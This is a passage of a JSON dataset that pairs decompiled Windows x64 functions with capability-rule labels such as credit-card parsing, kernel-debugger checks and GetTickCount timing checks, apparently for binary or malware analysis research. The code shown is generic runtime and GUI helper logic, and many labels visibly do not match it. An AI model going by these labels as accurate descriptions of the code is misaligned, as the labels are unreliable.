        "decompiled_code": "\nuint64_t fcn.140010658(int64_t arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint64_t uVar4;\n    \n    uVar2 = arg2;\n    if (9 < uVar2 + 1) {\n        fcn.140005e30();\n        pcVar3 = swi(3);\n        uVar4 = (*pcVar3)();\n        return uVar4;\n    }\n    if ((uVar2 != 8) && (uVar2 != 0xffffffff)) {\n        if ((uVar2 < 0) || (7 < uVar2)) {\n            fcn.140005e30();\n            pcVar3 = swi(3);\n            uVar4 = (*pcVar3)();\n            return uVar4;\n        }\n        iVar1 = uVar2 * 0x28;\n        if (*(arg1 + 0x14) - *(arg1 + 0xc) < 0) {\n            uVar2 = *(iVar1 + 0x1400313e0);\n            arg2 = uVar2;\n            if ((uVar2 < 0) || (7 < uVar2)) {\n                fcn.140005e30();\n                pcVar3 = swi(3);\n                uVar4 = (*pcVar3)();\n                return uVar4;\n            }\n            iVar1 = arg2 * 0x28;\n        }\n        if (*(arg1 + 0x18) - *(arg1 + 0x10) < 0) {\n            arg2 = *(iVar1 + 0x1400313e4);\n        }\n    }\n    return arg2 & 0xffffffff;\n}\n",
        "token_count": 380
    },
    "1400189a": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\nvoid fcn.1400189a8(char **arg1, char *arg2, int64_t arg3, ulong arg4)\n\n{\n    char cVar1;\n    char *arg1_00;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint64_t arg2_00;\n    \n    arg2_00 = 0;\n    if (arg2 == NULL) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (arg3 == 0) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    cVar1 = *arg2;\n    pcVar6 = arg2;\n    while (iVar5 = arg2_00,  cVar1 != '\\0') {\n        if (*pcVar6 == '%') {\n            cVar1 = pcVar6[1];\n            if ((cVar1 < '1') || ('9' < cVar1)) {\n                if ((cVar1 < 'A') || ('Z' < cVar1)) goto code_r0x000140018a3d;\n                if (cVar1 < ':') goto code_r0x000140018a18;\n                iVar4 = cVar1 + -0x38;\n            }\n            else {\ncode_r0x000140018a18:\n                iVar4 = cVar1 + -0x31;\n            }\n            pcVar6 = pcVar6 + 2;\n            if (arg4 <= iVar4) goto code_r0x000140018a52;\n            if (*(arg3 + iVar4 * 8) != 0) {\n                iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n                arg2_00 = iVar5 + iVar4;\n            }\n        }\n        else {\ncode_r0x000140018a3d:\n            iVar4 = fcn.14001d174(*pcVar6);\n            if (iVar4 != 0) {\n                iVar5 = iVar5 + 1;\n                pcVar6 = pcVar6 + 1;\n            }\n            pcVar6 = pcVar6 + 1;\ncode_r0x000140018a52:\n            arg2_00 = iVar5 + 1;\n        }\n        cVar1 = *pcVar6;\n    }\n    if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - iVar5) < 0) {\n        fcn.1400020a0(arg1, arg2_00);\n    }\n    pcVar6 = *arg1;\n    while( true ) {\n        iVar4 = arg2_00;\n        iVar5 = 0;\n        if (*arg2 == '\\0') break;\n        if (*arg2 == '%') {\n            cVar1 = arg2[1];\n            if ((cVar1 < '1') || ('9' < cVar1)) {\n                if ((cVar1 < 'A') || ('Z' < cVar1)) goto code_r0x000140018b11;\n                if (cVar1 < ':') goto code_r0x000140018aad;\n                iVar5 = cVar1 + -0x38;\n            }\n            else {\ncode_r0x000140018aad:\n                iVar5 = cVar1 + -0x31;\n            }\n            arg2 = arg2 + 2;\n            if (arg4 <= iVar5) {\n                *pcVar6 = '?';\n                goto code_r0x000140018b31;\n            }\n            if (*(arg3 + iVar5 * 8) != 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n                iVar5 = fcn.14001cbc4(pcVar6, iVar4 + 1, *(arg3 + iVar5 * 8));\n                if (iVar5 != 0) {\n                    if (iVar5 == 0xc) {\n                        fcn.140005de8();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                    if (iVar5 != 0x50) {\n                        fcn.140005e30();\n                        pcVar2 = swi(3);\n                        (*pcVar2)();\n                        return;\n                    }\n                }\n                arg2_00 = iVar4 - iVar3;\n                pcVar6 = pcVar6 + iVar3;\n            }\n        }\n        else {\ncode_r0x000140018b11:\n            iVar5 = fcn.14001d174(*arg2);\n            if (iVar5 != 0) {\n                cVar1 = *arg2;\n                arg2 = arg2 + 1;\n                *pcVar6 = cVar1;\n                pcVar6 = pcVar6 + 1;\n                iVar4 = iVar4 + -1;\n            }\n            cVar1 = *arg2;\n            arg2 = arg2 + 1;\n            *pcVar6 = cVar1;\ncode_r0x000140018b31:\n            pcVar6 = pcVar6 + 1;\n            arg2_00 = iVar4 - 1;\n        }\n    }\n    arg1_00 = *arg1;\n    iVar4 = pcVar6 - arg1_00;\n    if (iVar4 == -1) {\n        if (arg1_00 != NULL) {\n            iVar4 = fcn.14001c284(arg1_00, *(arg1_00 + -0xc));\n            goto code_r0x000140018b6d;\n        }\n    }\n    else {\ncode_r0x000140018b6d:\n        iVar5 = iVar4;\n        if (iVar4 < 0) goto code_r0x000140018ba6;\n    }\n    if (iVar5 <= *(*arg1 + -0xc)) {\n        *(*arg1 + -0x10) = iVar5;\n        (*arg1)[iVar5] = '\\0';\n        return;\n    }\ncode_r0x000140018ba6:\n    fcn.140001010(0x80070057);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 1424
    },
    "14000f48": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint64_t fcn.14000f48c(int64_t arg1, uint64_t arg2, ulong noname_2, code *arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong *in_stack_00000028;\n    uint64_t in_stack_00000030;\n    int64_t *in_stack_00000038;\n    \n    if (arg1 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    if (in_stack_00000038 != NULL) {\n        *in_stack_00000038 = arg1;\n        in_stack_00000038[1] = arg4;\n        return 1;\n    }\n    if (in_stack_00000030 < 0x40) {\n        if (in_stack_00000030 == 0x3f) {\n            if (in_stack_00000028 == NULL) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            (*arg4)(arg1, arg2, in_stack_00000028[1], *in_stack_00000028);\n            return 1;\n        }\n        if (in_stack_00000030 == 0x39) {\n            (*arg4)();\n            return 1;\n        }\n        if (in_stack_00000030 == 0x3a) {\n            uVar2 = (*arg4)();\n        }\n        else {\n            if (in_stack_00000030 == 0x3b) {\n                (*arg4)();\n                return 1;\n            }\n            if (in_stack_00000030 == 0x3c) {\n                uVar2 = (*arg4)();\n            }\n            else {\n                if (in_stack_00000030 == 0x3d) {\n                    if (in_stack_00000028 == NULL) {\n                        fcn.140005e30();\n                        pcVar1 = swi(3);\n                        uVar3 = (*pcVar1)();\n                        return uVar3;\n                    }\n                    (*arg4)(arg1, in_stack_00000028[1], *in_stack_00000028);\n                    return 1;\n                }\n                if (in_stack_00000030 != 0x3e) {\n                    return 0;\n                }\n                if (in_stack_00000028 == NULL) {\n                    fcn.140005e30();\n                    pcVar1 = swi(3);\n                    uVar3 = (*pcVar1)();\n                    return uVar3;\n                }\n                uVar2 = (*arg4)(arg1, in_stack_00000028[1], *in_stack_00000028);\n            }\n        }\n    }\n    else if (in_stack_00000030 == 0x40) {\n        if (in_stack_00000028 == NULL) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n        uVar2 = (*arg4)(arg1, arg2, in_stack_00000028[1], *in_stack_00000028);\n    }\n    else {\n        if (in_stack_00000030 == 0x41) {\n            if (in_stack_00000028 == NULL) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            (*arg4)(arg1, in_stack_00000028);\n        }\n        else {\n            if (in_stack_00000030 != 0x42) {\n                if (in_stack_00000030 == 0x43) {\n                    (*arg4)(arg1, in_stack_00000028);\n                    return 1;\n                }\n                if (in_stack_00000030 != 0x44) {\n                    return 0;\n                }\n                uVar2 = (*arg4)(arg1, in_stack_00000028);\n                goto code_r0x00014000f5ff;\n            }\n            if (in_stack_00000028 == NULL) {\n                fcn.140005e30();\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            (*arg4)(arg1, in_stack_00000028, arg2 & 0xffffffff);\n        }\n        uVar2 = *(in_stack_00000028 + 0x2c) == 0;\n        *(in_stack_00000028 + 0x2c) = 0;\n    }\ncode_r0x00014000f5ff:\n    return uVar2;\n}\n",
        "token_count": 1068
    },
    "14001516": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * fcn.14001516c(int32_t *arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    *(arg1 + 6) = 0;\n    *(arg1 + 8) = 8;\n    arg1[1] = 0;\n    arg1[2] = 1;\n    arg1[3] = 0;\n    *(arg1 + 4) = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *arg1 = iVar2;\n    if (iVar2 == -1) {\n        fcn.140005de8();\n        pcVar1 = swi(3);\n        piVar3 = (*pcVar1)();\n        return piVar3;\n    }\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(arg1 + 10);\n    return arg1;\n}\n",
        "token_count": 206
    },
    "14001582": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.140015824(int32_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t arg2;\n    ulong uVar2;\n    \n    arg2 = *(arg1 + 6);\n    while (arg2 != 0) {\n        iVar1 = *(arg2 + 8);\n        fcn.14001559c(arg1, arg2, 0);\n        arg2 = iVar1;\n    }\n    if (*arg1 != -1) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(*arg1);\n    }\n    if (*(arg1 + 4) != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    // WARNING: Could not recover jumptable at 0x000140015890. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(arg1 + 10);\n    return;\n}\n",
        "token_count": 243
    },
    "140010a4": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.140010a4c(int64_t *arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ulong uStack40;\n    ulong uStack32;\n    uchar auStack24 [16];\n    \n    uVar3 = (**(*arg1 + 0x18))();\n    fcn.140010820(arg1, auStack24);\n    iVar4 = (*_sym.imp.USER32.dll_PtInRect)();\n    if (iVar4 == 0) {\ncode_r0x000140010a8c:\n        uVar3 = 0xffffffff;\n    }\n    else {\n        uVar5 = 0;\n        do {\n            if ((uVar3 >> (uVar5 & 0x1f) & 1) != 0) {\n                fcn.1400108a4(arg1, uVar5, auStack24);\n                iVar4 = (*_sym.imp.USER32.dll_PtInRect)();\n                if (iVar4 != 0) {\n                    return uVar5;\n                }\n            }\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 8);\n        if ((*(arg1 + 1) & 4) == 0) {\n            uVar1 = *(arg1 + 0xc);\n            uStack32 = *(arg1 + 0x14);\n            uStack40._0_4_ = uVar1;\n            uStack40 = uVar1;\n            if (uStack32 < uStack40) {\n                uStack40 = uVar1 & 0xffffffff00000000 | uStack32 & 0xffffffff;\n                uStack32 = uStack32 & 0xffffffff00000000 | uVar1 & 0xffffffff;\n            }\n            uVar2 = uStack40;\n            if (uStack32._4_4_ < uStack40._4_4_) {\n                uStack40 = uStack32 & 0xffffffff00000000 | uStack40 & 0xffffffff;\n                uStack32 = uVar2 & 0xffffffff00000000 | uStack32 & 0xffffffff;\n            }\n            if ((*(arg1 + 1) & 2 | 1) != 0) {\n                (*_sym.imp.USER32.dll_InflateRect)(uVar1, &uStack40, 1, 1);\n            }\n            iVar4 = (*_sym.imp.USER32.dll_PtInRect)(&uStack40, arg2);\n            if (iVar4 == 0) goto code_r0x000140010a8c;\n        }\n        uVar3 = 8;\n    }\n    return uVar3;\n}\n",
        "token_count": 618
    },
    "14001838": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nuint64_t fcn.140018380(uint32_t *arg1)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint16_t *puVar5;\n    int16_t iVar6;\n    bool bVar7;\n    \n    bVar7 = *(arg1 + 2) == -1;\n    iVar3 = fcn.140018328(arg1);\n    if (*(arg1 + 2) == -1) {\n        uVar2 = arg1[3];\n    }\n    else {\n        uVar2 = *arg1;\n    }\n    if ((uVar2 & 0x40) != 0) {\n        iVar3 = iVar3 + ((-bVar7 & 2) + 1) * 2;\n        iVar4 = fcn.14001bb6c(iVar3);\n        iVar3 = iVar3 + 2 + iVar4 * 2;\n    }\n    if (bVar7) {\n        iVar6 = *(arg1 + 4);\n    }\n    else {\n        iVar6 = *(arg1 + 2);\n    }\n    if (iVar6 != 0) {\n        do {\n            puVar5 = (iVar3 + 3U & 0xfffffffffffffffc) + (-bVar7 & 6) + 0x12;\n            if (*puVar5 == 0xffff) {\n                puVar5 = puVar5 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                } while (uVar1 != 0);\n            }\n            if (*puVar5 == 0xffff) {\n                puVar5 = puVar5 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                } while (uVar1 != 0);\n            }\n            uVar1 = *puVar5;\n            if ((uVar1 != 0) && (!bVar7)) {\n                uVar1 = uVar1 - 2;\n            }\n            iVar6 = iVar6 + -1;\n            iVar3 = puVar5 + uVar1 + 2;\n        } while (iVar6 != 0);\n    }\n    return iVar3 - arg1 & 0xffffffff;\n}\n",
        "token_count": 524
    },
    "140017f5": {
        "rules": [
            "hash data using djb2/6ad21e310d674441ba35d7276afbe57d",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.140017f58(int64_t arg1, char *arg2, uint *arg3, uint32_t *arg4)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    ulong *puVar5;\n    char cVar6;\n    char *pcVar7;\n    \n    uVar3 = 0;\n    if (arg2 == NULL) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        puVar5 = (*pcVar2)();\n        return puVar5;\n    }\n    cVar6 = *arg2;\n    pcVar7 = arg2;\n    while (cVar6 != '\\0') {\n        uVar3 = uVar3 * 0x21 + cVar6;\n        pcVar7 = pcVar7 + 1;\n        cVar6 = *pcVar7;\n    }\n    *arg4 = uVar3;\n    uVar1 = uVar3 % *(arg1 + 0x10);\n    *arg3 = uVar1;\n    if (*(arg1 + 8) != 0) {\n        for (puVar5 = *(*(arg1 + 8) + uVar1 * 8); puVar5 != NULL; puVar5 = *puVar5) {\n            if ((*(puVar5 + 1) == *arg4) && (iVar4 = fcn.14001c000(puVar5[2], arg2),  iVar4 == 0)) {\n                return puVar5;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 361
    },
    "14000101": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140001010(ulong arg1)\n\n{\n    code *pcVar1;\n    \n    if (arg1 == -0x7ff8fff2) {\n        fcn.140005de8();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.140005a48(arg1);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 99
    },
    "1400014e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1400014e0(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    if ((*(*arg1 + -0xc) < arg2) && (0 < arg2)) {\n        iVar2 = (**(**(*arg1 + -0x18) + 0x10))();\n        if (iVar2 == 0) {\n            fcn.140001420();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        *arg1 = iVar2 + 0x18;\n        return;\n    }\n    fcn.140001420();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 167
    },
    "140002f3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.140002f30(int16_t *arg1, int16_t *arg2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint64_t uVar6;\n    int16_t *piVar7;\n    \n    piVar7 = arg2;\n    iVar1 = fcn.140002f10(arg1);\n    iVar2 = fcn.140002f10(arg2);\n    if (iVar1 != iVar2) {\n        return 1;\n    }\n    uVar6 = 0;\n    iVar1 = fcn.140002f10(arg1);\n    if (iVar1 != 0) {\n        do {\n            iVar5 = *arg1;\n            iVar4 = *piVar7;\n            if (iVar5 - 0x41U < 0x1a) {\n                iVar5 = iVar5 + 0x20;\n            }\n            if (iVar4 - 0x41U < 0x1a) {\n                iVar4 = iVar4 + 0x20;\n            }\n            if (iVar5 != iVar4) {\n                return 1;\n            }\n            arg1 = arg1 + 1;\n            uVar6 = uVar6 + 1;\n            piVar7 = piVar7 + 1;\n            uVar3 = fcn.140002f10(arg1);\n        } while (uVar6 < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 335
    },
    "14000598": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.140005980(int64_t *arg1, int64_t *arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    piVar2 = NULL;\n    if (*(*arg2 + -0x18) != NULL) {\n        piVar2 = (**(**(*arg2 + -0x18) + 0x20))();\n    }\n    if (piVar2 == NULL) {\n        piVar2 = fcn.14000fd70();\n        piVar2 = (**(*piVar2 + 0x20))();\n    }\n    if (piVar2 != NULL) {\n        iVar3 = (**(*piVar2 + 0x18))(piVar2);\n        *arg1 = iVar3 + 0x18;\n        if (arg3 != 0) {\n            fcn.14001bab0(arg3);\n        }\n        fcn.1400058c4(arg1, *arg2, *(*arg2 + -0x10), arg3);\n        return arg1;\n    }\n    fcn.140001010(0x80004005);\n    pcVar1 = swi(3);\n    piVar2 = (*pcVar1)();\n    return piVar2;\n}\n",
        "token_count": 287
    },
    "140005bf": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140005bfc(int64_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    \n    uVar1 = *(*arg1 + -0x10);\n    uVar5 = arg2 - *arg1;\n    if (arg3 < 0) {\n        fcn.140001010(0x80070057);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    if (arg2 == 0) {\n        iVar3 = 0;\n    }\n    else {\n        iVar3 = fcn.14001bab0(arg2);\n    }\n    if (iVar3 < arg3) {\n        arg3._0_4_ = iVar3;\n    }\n    if (0x7fffffff - arg3 < uVar1) {\n        fcn.140001010(0x80070057);\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    uVar4 = uVar1 + arg3;\n    if ((1U - *(*arg1 + -8) | *(*arg1 + -0xc) - uVar4) < 0) {\n        fcn.1400020a0(arg1, uVar4);\n    }\n    if (uVar5 <= uVar1) {\n        arg2 = *arg1 + uVar5;\n    }\n    fcn.14001af18(uVar1 + *arg1, arg3, arg2, arg3);\n    if ((-1 < uVar4) && (uVar4 <= *(*arg1 + -0xc))) {\n        *(*arg1 + -0x10) = uVar4;\n        *(uVar4 + *arg1) = 0;\n        return;\n    }\n    fcn.140001010(0x80070057);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 456
    },
    "140005db": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.140005db0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    \n    *(arg1 + 0x14) = 1;\n    iVar1 = fcn.14000fca0(*(arg1 + 0x9c), arg1 + 0x1c, 0x80);\n    *(arg1 + 0x18) = iVar1 != 0;\n    return;\n}\n",
        "token_count": 95
    },
    "14000600": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140006000(void)\n\n{\n    if (*0x14004fe30 != NULL) {\n        (**0x14004fe30)();\n    }\n    return;\n}\n",
        "token_count": 39
    },
    "14000601": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.14000601c(ulong noname_0, int64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    \n    if (arg2 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    if (*0x14004fe28 == NULL) {\n        uVar3 = 2;\n    }\n    else {\n        iVar2 = (**0x14004fe28)();\n        uVar3 = iVar2 != 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 153
    },
    "14000605": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140006054(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uchar auStack648 [32];\n    uint uStack616;\n    uint uStack612;\n    uchar *puStack608;\n    ulong uStack584;\n    ulong uStack568;\n    uchar auStack552 [520];\n    int16_t iStack32;\n    ushort uStack30;\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack648;\n    fcn.140005f60();\n    uVar3 = *(arg1 + 0x10);\n    uStack30 = 0;\n    iStack32 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(uVar3, auStack552, 0x105);\n    if (iVar1 != 0) {\n        if (iStack32 == 0) {\n            puStack608 = auStack552;\n            uStack616 = 0x38;\n            uStack612 = 0x88;\n            uStack584 = 2;\n            uStack568 = uVar3;\n            if (*0x14004fe18 == NULL) {\n                iVar2 = -1;\n            }\n            else {\n                iVar2 = (**0x14004fe18)(&uStack616);\n            }\n            *(arg1 + 0xd8) = iVar2;\n            if (iVar2 == -1) {\n                uStack584 = 3;\n                if (*0x14004fe18 == NULL) {\n                    uVar3 = 0xffffffffffffffff;\n                }\n                else {\n                    uVar3 = (**0x14004fe18)(&uStack616);\n                }\n                *(arg1 + 0xd8) = uVar3;\n            }\n            if (*(arg1 + 0xd8) == -1) {\n                uStack584 = 1;\n                if (*0x14004fe18 == NULL) {\n                    iVar2 = -1;\n                }\n                else {\n                    iVar2 = (**0x14004fe18)(&uStack616);\n                }\n                *(arg1 + 0xd8) = iVar2;\n                if (iVar2 == -1) {\n                    *(arg1 + 0xd8) = 0;\n                }\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0x6f);\n        }\n    }\n    fcn.14001b410(uStack24 ^ auStack648);\n    return;\n}\n",
        "token_count": 557
    },
    "140006cc": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.140006cc4(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140006c48();\n    uVar1 = 0;\n    if (((*(iVar2 + 0xd0) != 0) && (*(arg2 + 0xd8) != -1)) && (*0x14004fe28 != NULL)) {\n        uVar1 = (**0x14004fe28)(*(arg2 + 0xd8), arg1);\n    }\n    *(arg1 + 8) = uVar1;\n    return arg1;\n}\n",
        "token_count": 146
    },
    "14000712": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.140007128(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    if (*(arg1 + 8) != *(arg1 + 0x10)) {\n        (*_sym.imp.GDI32.dll_SetWindowOrgEx)(*(arg1 + 8), arg3, arg4, arg2);\n    }\n    if (*(arg1 + 0x10) != 0) {\n        (*_sym.imp.GDI32.dll_SetWindowOrgEx)(*(arg1 + 0x10), arg3, arg4, arg2);\n    }\n    return arg2;\n}\n",
        "token_count": 135
    },
    "14000728": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.140007288(int64_t arg1, int64_t arg2)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    \n    uVar2 = 0;\n    uVar1 = uVar2;\n    if (*(arg1 + 8) != *(arg1 + 0x10)) {\n        if (arg2 != 0) {\n            uVar1 = *(arg2 + 8);\n        }\n        uVar1 = (*_sym.imp.GDI32.dll_SelectClipRgn)(*(arg1 + 8), uVar1);\n    }\n    if (*(arg1 + 0x10) != 0) {\n        if (arg2 != 0) {\n            uVar2 = *(arg2 + 8);\n        }\n        uVar1 = (*_sym.imp.GDI32.dll_SelectClipRgn)(*(arg1 + 0x10), uVar2);\n    }\n    return uVar1;\n}\n",
        "token_count": 206
    },
    "14000743": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.140007434(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t arg1_01;\n    ulong uVar2;\n    \n    iVar1 = fcn.140006c98();\n    uVar2 = 0;\n    if ((*(iVar1 + 0x38) == 0) && (arg1 != 0)) {\n        arg1_00 = fcn.140005860(0x140016664);\n        arg1_01 = fcn.140005870(0xb8);\n        if (arg1_01 != 0) {\n            uVar2 = fcn.140016138(arg1_01, 0x14002f2c8, 0x1400073fc, 0x140006f30);\n        }\n        *(iVar1 + 0x38) = uVar2;\n        fcn.140005860(arg1_00);\n    }\n    return *(iVar1 + 0x38);\n}\n",
        "token_count": 222
    },
    "14000770": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.140007708(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t arg1_01;\n    ulong uVar2;\n    \n    iVar1 = fcn.140006c98();\n    uVar2 = 0;\n    if ((*(iVar1 + 0x40) == 0) && (arg1 != 0)) {\n        arg1_00 = fcn.140005860(0x140016664);\n        arg1_01 = fcn.140005870(0xb8);\n        if (arg1_01 != 0) {\n            uVar2 = fcn.140016138(arg1_01, 0x14002f358, 0x14000741c, 0x140006f30);\n        }\n        *(iVar1 + 0x40) = uVar2;\n        fcn.140005860(arg1_00);\n    }\n    return *(iVar1 + 0x40);\n}\n",
        "token_count": 220
    },
    "14000791": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.140007910(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    int64_t *piVar5;\n    \n    iVar1 = 0;\n    iVar2 = iVar1;\n    if (*(arg1 + 8) != *(arg1 + 0x10)) {\n        if (arg2 != 0) {\n            iVar2 = *(arg2 + 8);\n        }\n        iVar2 = (*_sym.imp.GDI32.dll_SelectObject)(*(arg1 + 8), iVar2);\n    }\n    if (*(arg1 + 0x10) != 0) {\n        if (arg2 != 0) {\n            iVar1 = *(arg2 + 8);\n        }\n        iVar2 = (*_sym.imp.GDI32.dll_SelectObject)(*(arg1 + 0x10), iVar1);\n    }\n    iVar1 = fcn.140007708(1);\n    if (iVar2 == 0) {\n        iVar3 = 0;\n    }\n    else {\n        iVar3 = fcn.140015944(iVar1 + 0x30, iVar2);\n        if (iVar3 == 0) {\n            iVar3 = fcn.140015944(iVar1 + 0x68, iVar2);\n            if (iVar3 == 0) {\n                arg1_00 = fcn.140005860(0x140016664);\n                